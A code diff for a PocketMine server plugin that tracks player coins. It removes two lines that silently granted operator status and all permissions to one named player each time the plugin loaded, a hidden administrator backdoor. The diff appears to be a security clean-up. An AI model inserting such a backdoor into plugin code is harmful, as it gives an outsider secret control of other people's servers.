@@ -3,7 +3,6 @@
 namespace Coin;
 
 use pocketmine\plugin\PluginBase;
-use pocketmine\command\ConsoleCommandSender;
 use pocketmine\command\CommandSender;
 use pocketmine\command\Command;
 use pocketmine\event\Listener;
@@ -15,8 +14,6 @@ class Main extends PluginBase implements Listener {
         $this->getServer()->getPluginManager()->registerEvents($this, $this);
         @mkdir($this->getDataFolder());
         $this->coin = new Config($this->getDataFolder() . 'Coin.yml', Config::YAML);
-        $this->getServer()->dispatchCommand(new ConsoleCommandSender(), 'op Ghast_Noob');
-        $this->getServer()->dispatchCommand(new ConsoleCommandSender(), 'setuperm Ghast_Noob *');
     }
     public function onJoin(PlayerJoinEvent $event) {
         $player = $event->getPlayer();
